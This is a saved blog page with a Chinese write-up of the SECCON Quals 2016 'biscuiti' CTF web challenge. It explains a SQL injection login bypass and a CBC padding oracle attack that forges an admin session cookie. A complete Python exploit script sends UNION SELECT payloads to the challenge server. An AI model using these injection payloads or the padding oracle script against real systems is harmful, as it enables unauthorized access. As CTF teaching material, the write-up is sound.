@@ -1,0 +1,460 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog</title>
+<link href="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content="比较有意思的一个关于密码学的web，比赛当时在厦门跟队友面基，晚上太累，回宾馆也没细看，今天又研究了下:)很友好地给了源码，在源码中我们很容易可以发现三个点：cookie是CBC加密的，必然存在..." name="description">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-194'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-194'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-194');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _pfHx = /* '1Ln'//'1Ln' */''+'eaf'//'Q4x'
++'d2'//'m7B'
++//'gf'
+'aa3'+'8'//'J05'
++//'u'
+'u'+//'9BV'
+'1f'+'e'//'j'
++'93e'//'bv'
++//'EfC'
+'a2a'+//'N'
+'7e3'+//'cT1'
+'3'+'5'//'USG'
++''///*'Ki'*/'Ki'
++/* 'tjM'//'tjM' */''+'ng'//'ng'
++'2f'//'j'
++'95c'//'GNQ'
++''///*'u'*/'u'
++'f'//'MM'
++//'4Tc'
+'3c8', _JH1DCy = [[9,10],[23,25]];
+    
+    for (var i = 0; i < _JH1DCy.length; i ++) {
+        _pfHx = _pfHx.substring(0, _JH1DCy[i][0]) + _pfHx.substring(_JH1DCy[i][1]);
+    }
+
+    return _pfHx;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">SECCON Quals 2016 – biscuiti-writeup</div>
+<small class="article-time">发表于： <time datetime="2016-12-16T20:38:00+00:00" itemprop="datePublished">2016-12-16</time> | 分类： <a href="http://www.venenof.com/index.php/category/PHP/">PHP</a>,<a href="http://www.venenof.com/index.php/category/CTF/">CTF</a>,<a href="http://www.venenof.com/index.php/category/Web/">Web</a> | <a href="http://www.venenof.com/index.php/archives/194/#comments" itemprop="discussionUrl">评论：4 </a> | 阅读：397</small>
+<div class="article-content">
+<p>比较有意思的一个关于密码学的web，比赛当时在厦门跟队友面基，晚上太累，回宾馆也没细看，今天又研究了下:)<br/>
+很友好地给了源码，在源码中我们很容易可以发现三个点：</p>
+<ul>
+<li>cookie是CBC加密的，必然存在一些漏洞。</li>
+<li>存在一个sql注入</li>
+</ul>
+<!--more-->
+<p>首先看源码：<br/>
+<img alt="1.png" src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/945734290.png"/><br/>
+显然在这里有一个sqli绕过登录，看下auth函数：<br/>
+<img alt="2.png" src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/2063051052.png"/><br/>
+很明了嘛，直接veneno' union select 'admin','1就可以登录，但是我们会发现query里是没有isadmin的，也就是就算我们绕过也拿不到flag，心痛:(<br/>
+下面就是利用CBC的padding oracle attack去构造一个符合要求的cookie，这时候看下cookie的生成方式：<br/>
+<img alt="3.png" src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/3794115698.png"/><br/>
+而在CBC中，初始化向量IV与明文(第一组明文)XOR后，再经过运算得到的结果作为新的IV，用于下一分组(分组2)，如果迭代下去。每一组的明文长度就是16，我们随意生成一个，解密后是这个样子：</p>
+<p>a:2:{s:4:"name";s:6:"Veneno";s:7:"isadmin";N;}SúCCER­fèiëÓ</p>
+<p>那么我们把它分为16个字节一组：</p>
+<pre><code>a:2:{s:4:"name";
+s:6:"Veneno";s:7
+:"isadmin";N;}Sú
+CCER­fèiëÓ
+</code></pre>
+<p>而我们现在是想让isadmin为1，也就是：<strong>s:7:"isadmin";b:1;</strong><br/>
+现在想一下，我们可以控制的点貌似只有name那里，那么怎么修改，如果直接修改肯定是不现实的，因为你过不了mac校验，那么我们想的是，我们控制一个地方的内容，同时不会影响后面的内容不就好了，于是就变成了下面这个样子：</p>
+<pre><code>a:2:{s:4:"name";
+s:6:"Venenoxxxxx
+xxxxxxxxxxxxxxxx
+";s:7:"isadmin";
+N;}SúCCER­fèiëÓ
+</code></pre>
+<p>go on。我们最后想要的结果是这个样子：</p>
+<pre><code>P1=&gt;a:2:{s:4:"name";
+P2=&gt;s:6:"Venenoxxxx
+P3=&gt;xxxxxxxxxxxxxxxx
+P4=&gt;";s:7:"isadmin";
+P5=&gt;b:1;}new233333
+</code></pre>
+<p>这样我们可以控制的地方就很明了了:)</p>
+<pre><code>P1 =&gt; a:2:{s:4:"name"; -&gt; 可求 (C1)
+P2 =&gt; s:26:"Venenoxxxx -&gt; 可求 (C2)
+P3'=&gt; magic_value_here -&gt; 可求 (C3')
+P4 =&gt; ";s:7:"isadmin"; -&gt; 可求 (C4')
+P5 =&gt; N;}&lt;PAD__PKCS#7&gt; -&gt; 已知 (C5')
+我们想要的：
+P5'=&gt; b:1;}new233333 -&gt; &lt;_dont_know_the_correct_cipher_&gt; (C5', NEW MAC)
+</code></pre>
+<p>那么C3'是多少，我们可以这样算：</p>
+<pre><code class="language-php">P3' = magic_value_here = P5' ^ C4 ^ C2
+    = 'b:1;}&lt;NEW___PAD&gt;' ^ C4 ^ C2
+C3' = Encrypt(P3' ^ C2)
+    = Encrypt(P5' ^ C4 ^ C2 ^ C2)
+    = Encrypt(P5' ^ C4)
+    = C5'
+</code></pre>
+<p>所以整体的思路就是:<br/>
+C5已知=&gt;po攻击求C2&amp;C4=&gt;P5'已知=&gt;P3'已知=&gt;C3'=P3'^C2=&gt;求出C5=&gt;解决<br/>
+这样的话，就比较好理解了，感觉难点在于写脚本：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+from Crypto.Cipher import AES
+import requests
+import time
+import base64
+def xor(a, b):
+    return "".join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])
+def add_pad(s):
+    block_len = 16
+    pad_len = block_len - len(s)
+    return s + chr(pad_len)*pad_len
+def padding_oracle_attack(cipher, plain):
+    after_dec = ""
+    for k in range(1, 17):
+        for i in range(0, 256):
+            pad = xor(after_dec, chr(k)*(k-1))
+            iv = "A"*16
+            c = "A"*(16-k) + chr(i) + pad + cipher
+            assert len(iv + c) == 48
+            uname = "' UNION SELECT 'a', '%s" % (base64.b64encode(iv + c))
+            url = "http://biscuiti.pwn.seccon.jp/"
+            payload = payload = {"username":uname, "password":""}
+            r = requests.post(url, data=payload)
+            if r.text.find("Hello") &lt; 0:
+                after_dec = chr(i ^ k) + after_dec
+                print after_dec.encode("hex")
+                break
+    assert len(after_dec) == 16 
+    prev_cihper = xor(after_dec, plain)
+    return prev_cihper
+uname = "' UNION SELECT 'aaaaaaaaaaaaaaaaaaaaaaaaaa', 'hoge"
+url = "http://biscuiti.pwn.seccon.jp/"
+payload = payload = {"username":uname, "password":""}
+r = requests.post(url, data=payload)
+jsession = r.headers['set-cookie'].split("=")[1].replace("%3D", "=")
+u = base64.b64decode(jsession)
+j = u[:-16]
+mac_j = u[-16:]
+P = [j[i: i+16] for i in range(0, len(j), 16)]
+C = [""]*5
+P[4] = add_pad(P[4])
+C[4] = mac_j
+for i in reversed(range(1,5)):
+    C[i-1] = padding_oracle_attack(C[i], P[i])
+P[4] = add_pad("b:1;}")
+P[2] = xor(xor(P[4], C[3]), C[1])
+uname = "' UNION SELECT 'aaaaaaaaaa%s', 'hoge" % P[2]
+url = "http://biscuiti.pwn.seccon.jp/"
+payload = payload = {"username":uname, "password":""}
+r = requests.post(url, data=payload)
+jsession = r.headers['set-cookie'].split("=")[1].replace("%3D", "=")
+u = base64.b64decode(jsession)
+j = u[:-16]
+mac_j = u[-16:]
+P = [j[i: i+16] for i in range(0, len(j), 16)]
+C = [""]*5
+P[4] = add_pad(P[4])
+C[4] = mac_j
+for i in reversed(range(3,5)):
+    C[i-1] = padding_oracle_attack(C[i], P[i])
+jsession = base64.b64encode('a:2:{s:4:"name";s:26:"aaaaaaaaaaaaaaaaaaaaaaaaaa";s:7:"isadmin";b:1;}'+C[2])
+url = "http://biscuiti.pwn.seccon.jp/"
+header = {"Cookie":"JSESSION=%s" % jsession.replace("=","%3D")}
+r = requests.post(url, headers=header)
+print r.text
+</code></pre>
+<p>脚本从<a href="http://ttps://gist.github.com/sonickun/dba8163394b849f70b968690c02c169b">这里</a>拿的，感觉其实能算出第一组的C2/C4就可以了:)</p>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: none</div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/187/" title="Pwnhub第三期题目－WTF wp">Pwnhub第三期题目－WTF wp</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/204/" title="Pwnhub－找呀找呀找朋友 wp">Pwnhub－找呀找呀找朋友 wp</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="194" data-title="SECCON Quals 2016 – biscuiti-writeup" data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/jquery.min.js"></script>
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/all.js"></script>
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/jquery.js"></script>
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/prism.js"></script>
+<script src="./SECCON Quals 2016 – biscuiti-writeup - Veneno's Blog/search.js"></script>
+</div>
+
